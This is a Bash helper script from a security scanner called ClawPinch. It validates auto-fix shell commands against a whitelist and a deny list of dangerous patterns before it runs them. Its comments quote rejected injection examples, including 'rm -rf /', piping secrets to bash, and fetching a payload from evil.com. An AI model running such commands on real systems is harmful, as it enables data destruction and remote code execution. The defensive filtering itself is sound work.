#!/usr/bin/env bash
set -euo pipefail

# ─── ClawPinch safe command execution ───────────────────────────────────────
# Replaces unsafe eval() with whitelisted command execution.
# Source this file to access safe_exec_command().
#
# SECURITY RATIONALE:
#
# ClawPinch auto-fix features need to execute shell commands to remediate
# security findings. However, eval() is inherently unsafe because it allows
# arbitrary command execution without validation. Attack vectors include:
#
#   1. Malicious reference files: If an attacker compromises the supply chain
#      and modifies malicious-patterns.json or known-cves.json, they could
#      inject shell commands into the "auto_fix" field of findings.
#
#   2. Crafted findings: If a scanner is compromised or buggy, it could emit
#      findings with malicious auto_fix commands (e.g., "rm -rf /").
#
#   3. Configuration injection: User-controlled config values that flow into
#      auto_fix commands could contain shell metacharacters (;, |, $(), etc).
#
# This module implements defense-in-depth through a strict whitelist approach:
#
#   • WHITELIST: Only specific command patterns are allowed (regex match)
#   • BLACKLIST: Dangerous patterns are always blocked (even if whitelisted)
#   • VALIDATION: Each command type has custom validation logic
#   • LOGGING: All command attempts are logged for audit trails
#
# THE WHITELIST APPROACH:
#
# Instead of trying to sanitize arbitrary commands (which is error-prone), we
# define a finite set of allowed command structures. Each pattern is a regex
# that matches a specific, safe operation. For example:
#
#   Pattern:  ^jq '\.path = value' file.json > tmp && mv tmp file.json$
#   Matches:  jq '.auth = true' config.json > tmp && mv tmp config.json
#   Rejects:  jq 'del(.)' config.json > tmp       (destructive filter)
#   Rejects:  jq '.[] | @base64' config.json > tmp (data exfiltration)
#   Rejects:  jq '.auth=true' config.json | sh    (pipe to shell)
#   Rejects:  jq '.auth=true'; rm -rf /           (command injection)
#
# Commands are validated in three stages:
#   1. Check dangerous patterns (blacklist - always reject)
#   2. Check whitelist patterns (must match at least one)
#   3. Run command-specific validation (e.g., chmod must use numeric mode)
#
# USAGE EXAMPLES:
#
#   source "$(dirname "$0")/helpers/safe_exec.sh"
#
#   # JSON modification with jq (most common)
#   safe_exec_command "jq '.gateway.requireAuth = true' config.json > tmp && mv tmp config.json"
#
#   # Fix file permissions
#   safe_exec_command "chmod 600 /etc/openclaw/secrets.json"
#
#   # Backup before modification
#   safe_exec_command "cp config.json config.json.bak"
#
#   # In-place text replacement
#   safe_exec_command "sed -i 's/bindAddress: 0.0.0.0/bindAddress: 127.0.0.1/' openclaw.conf"
#
#   # Clean up temporary files
#   safe_exec_command "rm /tmp/clawpinch-scan-results.json"
#
# REJECTED COMMANDS (examples):
#
#   # Command injection via semicolon
#   safe_exec_command "jq '.auth=true' config.json; rm -rf /"
#   # → REJECTED: contains dangerous pattern ';'
#
#   # Pipe to shell interpreter
#   safe_exec_command "jq -r '.secrets' config.json | bash"
#   # → REJECTED: contains dangerous pattern '| bash'
#
#   # Command substitution
#   safe_exec_command "echo $(curl evil.com/payload) > config.json"
#   # → REJECTED: contains dangerous pattern '$('
#
#   # Wildcard glob expansion
#   safe_exec_command "rm /etc/openclaw/*.json"
#   # → REJECTED: contains dangerous pattern '*'
#
#   # Recursive deletion
#   safe_exec_command "chmod -R 777 /etc/openclaw"
#   # → REJECTED: recursive mode not allowed
#
# AUDIT LOGGING:
#
# All command validation attempts are logged to stderr. To enable persistent
# audit logging, set the CLAWPINCH_AUDIT_LOG environment variable:
#
#   export CLAWPINCH_AUDIT_LOG=/var/log/clawpinch-audit.log
#   safe_exec_command "chmod 600 secrets.json"
#   # → [2025-02-06T10:30:45Z] [info] [safe_exec] Executing: chmod 600 secrets.json
#
# ADDING NEW COMMANDS:
#
# If you need to whitelist a new command type, follow these steps carefully:
#
# 1. Add a pattern to _SAFE_EXEC_PATTERNS array
#    • Use anchors (^ and $) to match the entire command
#    • Use strict character class [a-zA-Z0-9/._-]+ for file paths
#    • Add inline comments with examples
#
# 2. Add validation in _validate_command()
#    • Add a case for the new command in the switch statement
#    • Validate all arguments and flags
#    • Reject dangerous variations (e.g., recursive flags, wildcards)
#
# 3. Add test cases to test_safe_exec.sh
#    • Test valid commands (should succeed)
#    • Test invalid commands (should be rejected)
#    • Test boundary cases and injection attempts
#
# 4. Document the use case and security considerations
#    • Explain why the command is needed
#    • Document attack vectors you've considered
#    • List any residual risks
#
# SECURITY CONSIDERATIONS:
#
# • This module still uses eval() internally, but ONLY after strict validation
# • Regex patterns must be carefully tested to avoid bypasses
# • New command types increase attack surface — only add when necessary
# • Consider if the operation can be done without shell execution (e.g., pure bash)
# • Review threat-model.md before adding command patterns

# ─── Command whitelist patterns ─────────────────────────────────────────────
# Each pattern is a regex that matches allowed command structures.
# Patterns are checked in order — first match wins.

declare -a _SAFE_EXEC_PATTERNS=(
  # jq JSON modification with output to temp file + mv (assignment only)
  # Example: jq '.gateway.bindAddress = "127.0.0.1:3000"' openclaw.json > tmp && mv tmp openclaw.json
  # Restricted to assignment operations only — blocks del(), @base64, and other arbitrary filters
  # Filter must be single-quoted and match: .path = value
  '^jq '\''\.[-a-zA-Z0-9._]+[[:space:]]*=[[:space:]]*[a-zA-Z0-9 ".:,/_-]*'\'' [a-zA-Z0-9/._-]+\.json > tmp && mv tmp [a-zA-Z0-9/._-]+\.json$'

  # jq JSON modification to temp file (assignment only, without mv in same command)
  # Example: jq '.gateway.requireAuth = true' config.json > tmp
  '^jq '\''\.[-a-zA-Z0-9._]+[[:space:]]*=[[:space:]]*[a-zA-Z0-9 ".:,/_-]*'\'' [a-zA-Z0-9/._-]+\.json > tmp$'

  # mv command for file rename (used after jq, or for backup restore)
  # Destination restricted to .json files to prevent overwriting executables
  # Example: mv tmp openclaw.json  OR  mv config.json.bak config.json
  '^mv [a-zA-Z0-9/._-]+ [a-zA-Z0-9/._-]+\.json$'

  # chmod for permission fixes (numeric mode only, specific files)
  # Example: chmod 600 /path/to/openclaw.json
  '^chmod [0-7]{3,4} [a-zA-Z0-9/._-]+$'

  # sed in-place edit (specific file, no pipes or dangerous chars)
  # Non-empty replacement required to prevent accidental config value deletion
  # Example: sed -i 's/foo/bar/' file.conf  OR  sed -i 's/foo/bar/g' file.conf
  '^sed -i[^ ]* '\''s/[^'\'']+/[^'\'']+/g?'\'' [a-zA-Z0-9/._-]+$'

  # cp with specific source and destination (no wildcards)
  # Example: cp config.json config.json.bak
  '^cp [a-zA-Z0-9/._-]+ [a-zA-Z0-9/._-]+$'

  # rm single file (no wildcards, no directories, no -rf)
  # Example: rm /tmp/clawpinch-temp.json
  '^rm [a-zA-Z0-9/._-]+$'
)

# ─── Dangerous pattern detection ────────────────────────────────────────────
# Commands matching any of these patterns are ALWAYS rejected, even if they
# match a whitelist pattern. Defense in depth.

declare -a _DANGEROUS_PATTERNS=(
  # Command chaining and substitution
  ';'           # command chaining
  '&&'          # conditional execution (except specific whitelisted cases)
  '\|\|'        # conditional execution
  '&'           # background execution
  '\$\('        # command substitution
  '\$\{'        # variable/command substitution (${VAR}, ${cmd})
  '`'           # command substitution (backticks)
  '\('          # process substitution / subshell
  '\)'          # process substitution / subshell

  # Redirection to dangerous targets
  '> */dev/'    # writing to device files
  '< */dev/'    # reading from device files (except /dev/null)
  '>> */'       # append redirection (not in whitelist)

  # Pipes to interpreters or shells
  '\| *bash'
  '\| *sh'
  '\| *zsh'
  '\| *python'
  '\| *perl'
  '\| *ruby'
  '\| *node'

  # File descriptor manipulation
  '[0-9]>&[0-9]'

  # Wildcards and glob/brace expansion
  '\*'
  '\?'
  '\['
  '\]'
  '\{'
  '\}'

  # Path traversal
  '\.\.'        # directory traversal

  # Environment variable expansion (all forms: $VAR, $var, ${VAR})
  '\$[a-zA-Z_][a-zA-Z0-9_]*'

  # Special shell variables ($$, $?, $0-$9)
  '\$[0-9]'
  '\$\$'

  # Shell special characters
  '~'           # home directory expansion
  '#'           # comment (can hide commands)
)

# ─── Logging ────────────────────────────────────────────────────────────────

# Source common.sh for logging if available
if [[ -f "$(dirname "${BASH_SOURCE[0]}")/common.sh" ]]; then
  # shellcheck source=common.sh
  source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
fi

# Fallback logging if common.sh not available
if ! declare -f log_info >/dev/null 2>&1; then
  log_info()  { printf "[info]  %s\n" "$*" >&2; }
  log_warn()  { printf "[warn]  %s\n" "$*" >&2; }
  log_error() { printf "[error] %s\n" "$*" >&2; }
fi

_safe_exec_log() {
  local level="$1"
  shift
  local msg="$*"

  # Log to stderr for audit trail
  case "$level" in
    info)  log_info "[safe_exec] $msg" ;;
    warn)  log_warn "[safe_exec] $msg" ;;
    error) log_error "[safe_exec] $msg" ;;
  esac

  # Optionally log to audit file if CLAWPINCH_AUDIT_LOG is set
  if [[ -n "${CLAWPINCH_AUDIT_LOG:-}" ]]; then
    printf '[%s] [%s] [safe_exec] %s\n' \
      "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
      "$level" \
      "$msg" >> "$CLAWPINCH_AUDIT_LOG"
  fi
}

# ─── Command validation ─────────────────────────────────────────────────────

_validate_command() {
  local cmd="$1"

  # Step 1: Check for dangerous patterns first (blacklist)
  for pattern in "${_DANGEROUS_PATTERNS[@]}"; do
    if [[ "$cmd" =~ $pattern ]]; then
      # Special case: allow '&&' only in jq commands that match the full safe structure:
      #   jq '<filter>' <file>.json > tmp && mv tmp <file>.json
      # We validate the full pattern here (not just "starts with jq") to prevent
      # invalid jq commands with '&&' from slipping past the blacklist.
      if [[ "$pattern" == '&&' ]] && [[ "$cmd" =~ ^jq[[:space:]].*\>\ tmp\ \&\&\ mv\ tmp\ [a-zA-Z0-9/._-]+\.json$ ]]; then
        continue
      fi
      # Special case: allow '&' only when it's part of the safe '&&' jq+mv pattern above.
      if [[ "$pattern" == '&' ]] && [[ "$cmd" =~ ^jq[[:space:]].*\>\ tmp\ \&\&\ mv\ tmp\ [a-zA-Z0-9/._-]+\.json$ ]]; then
        continue
      fi
      _safe_exec_log error "Command rejected: contains dangerous pattern '$pattern'"
      return 1
    fi
  done

  # Step 2: Check if command matches any whitelist pattern
  local matched=0
  for pattern in "${_SAFE_EXEC_PATTERNS[@]}"; do
    if [[ "$cmd" =~ $pattern ]]; then
      matched=1
      break
    fi
  done

  if [[ $matched -eq 0 ]]; then
    _safe_exec_log error "Command rejected: does not match any whitelisted pattern"
    return 1
  fi

  # Step 3: Specific command validations

  # Extract command name (first word)
  local cmd_name
  read -r cmd_name _ <<< "$cmd"

  case "$cmd_name" in
    jq)
      # Validate jq command structure
      # Must have output to 'tmp' file
      if [[ ! "$cmd" =~ "> tmp" ]]; then
        _safe_exec_log error "jq command rejected: must redirect to 'tmp'"
        return 1
      fi

      # Input file must be a .json file
      if [[ ! "$cmd" =~ \.json ]]; then
        _safe_exec_log error "jq command rejected: input must be a .json file"
        return 1
      fi

      # Disallow jq flags that could be dangerous
      if [[ "$cmd" =~ --raw-output.*\| ]] || [[ "$cmd" =~ -r.*\| ]]; then
        _safe_exec_log error "jq command rejected: piped raw output not allowed"
        return 1
      fi
      ;;

    chmod)
      # Validate chmod mode is numeric only
      if [[ ! "$cmd" =~ ^chmod[[:space:]]+[0-7]{3,4}[[:space:]] ]]; then
        _safe_exec_log error "chmod command rejected: must use numeric mode (e.g., 600)"
        return 1
      fi

      # Disallow recursive chmod
      if [[ "$cmd" =~ -[Rr] ]]; then
        _safe_exec_log error "chmod command rejected: recursive mode not allowed"
        return 1
      fi
      ;;

    mv)
      # Disallow mv flags that could be dangerous
      if [[ "$cmd" =~ mv[[:space:]]+-[^[:space:]] ]]; then
        _safe_exec_log error "mv command rejected: flags not allowed"
        return 1
      fi
      ;;

    sed)
      # Validate sed has -i flag (in-place)
      if [[ ! "$cmd" =~ sed[[:space:]]+-i ]]; then
        _safe_exec_log error "sed command rejected: must use -i flag"
        return 1
      fi

      # Validate sed has substitution pattern
      if [[ ! "$cmd" =~ 's/' ]]; then
        _safe_exec_log error "sed command rejected: only substitution (s///) allowed"
        return 1
      fi
      ;;

    cp|rm)
      # Whitelist patterns already enforce strict [a-zA-Z0-9/._-]+ for paths
      ;;

    *)
      _safe_exec_log error "Unknown command: $cmd_name"
      return 1
      ;;
  esac

  return 0
}

# ─── Safe command execution ─────────────────────────────────────────────────

safe_exec_command() {
  local cmd="$1"

  # Trim leading/trailing whitespace (printf '%s' is safer than echo for arbitrary strings)
  cmd="$(printf '%s' "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"

  # Reject empty commands
  if [[ -z "$cmd" ]]; then
    _safe_exec_log error "Attempted to execute empty command"
    return 1
  fi

  # Validate command against whitelist and safety checks
  if ! _validate_command "$cmd"; then
    _safe_exec_log error "Command validation failed: $cmd"
    return 1
  fi

  # Log the command execution
  _safe_exec_log info "Executing: $cmd"

  # Execute the command
  # Note: We still use eval here, but ONLY after strict validation
  # This is necessary to handle shell operators like > and &&
  if eval "$cmd"; then
    _safe_exec_log info "Command succeeded: $cmd"
    return 0
  else
    local exit_code=$?
    _safe_exec_log error "Command failed with exit code $exit_code: $cmd"
    return $exit_code
  fi
}

# ─── Export function ────────────────────────────────────────────────────────

export -f safe_exec_command
